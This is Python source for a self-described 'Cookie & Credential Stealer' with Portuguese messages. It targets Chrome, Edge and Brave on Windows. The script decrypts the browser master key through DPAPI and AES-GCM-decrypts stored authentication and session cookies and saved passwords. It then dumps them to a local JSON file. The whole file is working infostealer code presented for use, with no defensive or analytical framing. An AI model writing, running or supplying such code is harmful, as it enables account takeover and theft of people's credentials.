# 🔥 cookie_stealer_refinado.py — Focado só em AUTENTICAÇÃO

import os
import json
import sqlite3
import base64
import shutil
import win32crypt
from pathlib import Path
from Crypto.Cipher import AES
from rich.console import Console

console = Console()

BROWSERS = {
    'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), r"Google\\Chrome\\User Data\\Default"),
    'Edge': os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\\Edge\\User Data\\Default"),
    'Brave': os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\\Brave-Browser\\User Data\\Default")
}

def get_master_key(profile_path: str) -> bytes:
    try:
        local_state_path = Path(profile_path).parent / "Local State"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        console.print(f"[red]Erro master_key: {e}[/red]")
        return b""

def decrypt_cookie(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if encrypted_value.startswith(b'v10'):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt(payload)[:-16].decode('utf-8')
        return ""
    except Exception:
        return ""

def dump_filtered_cookies(browser: str) -> list:
    profile_path = BROWSERS[browser]
    cookie_db = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookie_db):
        return []

    master_key = get_master_key(profile_path)
    cookies = []

    try:
        conn = sqlite3.connect(cookie_db)
    except sqlite3.OperationalError:
        temp_copy = cookie_db + "_tmp"
        shutil.copy2(cookie_db, temp_copy)
        conn = sqlite3.connect(temp_copy)

    try:
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host, name, encrypted_value in cursor.fetchall():
            decrypted_value = decrypt_cookie(encrypted_value, master_key)
            if decrypted_value and any(keyword in name.lower() for keyword in ["auth", "session", "token"]):
                cookies.append({
                    "domain": host,
                    "name": name,
                    "value": decrypted_value
                })
        conn.close()
    except Exception as e:
        console.print(f"[red]Erro cookies {browser}: {e}[/red]")
    finally:
        if os.path.exists(cookie_db + "_tmp"):
            os.remove(cookie_db + "_tmp")

    return cookies

def dump_filtered_credentials(browser: str) -> list:
    profile_path = BROWSERS[browser]
    login_db = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db):
        return []

    master_key = get_master_key(profile_path)
    credentials = []

    try:
        conn = sqlite3.connect(login_db)
    except sqlite3.OperationalError:
        temp_copy = login_db + "_tmp"
        shutil.copy2(login_db, temp_copy)
        conn = sqlite3.connect(temp_copy)

    try:
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, encrypted_password in cursor.fetchall():
            password = decrypt_cookie(encrypted_password, master_key)
            if username and password:
                credentials.append({
                    "url": url,
                    "username": username,
                    "password": password
                })
        conn.close()
    except Exception as e:
        console.print(f"[red]Erro credentials {browser}: {e}[/red]")
    finally:
        if os.path.exists(login_db + "_tmp"):
            os.remove(login_db + "_tmp")

    return credentials

def save_json(data: dict, filename: str):
    path = Path("output")
    path.mkdir(parents=True, exist_ok=True)
    full_path = path / filename
    with open(full_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    console.print(f"[green]✔ Resultado salvo em {full_path.resolve()}[/green]")

def main():
    console.rule("[bold red]Cookie & Credential Stealer Iniciado[/bold red]")
    dump = {}

    for browser in BROWSERS:
        console.rule(f"[blue]Processando {browser}[/blue]")

        cookies = dump_filtered_cookies(browser)
        credentials = dump_filtered_credentials(browser)

        if cookies or credentials:
            dump[browser] = {
                "cookies": cookies,
                "credentials": credentials
            }
            console.print(f"[green]✔ {len(cookies)} cookies & {len(credentials)} credenciais salvos[/green]")
        else:
            console.print(f"[yellow]⚠ Nada encontrado para {browser}[/yellow]")

    if dump:
        save_json(dump, "filtered_output.json")
    else:
        console.print("[red]Nenhum dado válido para salvar[/red]")

    console.rule("[bold green]Finalizado![/bold green]")

if __name__ == '__main__':
    main()
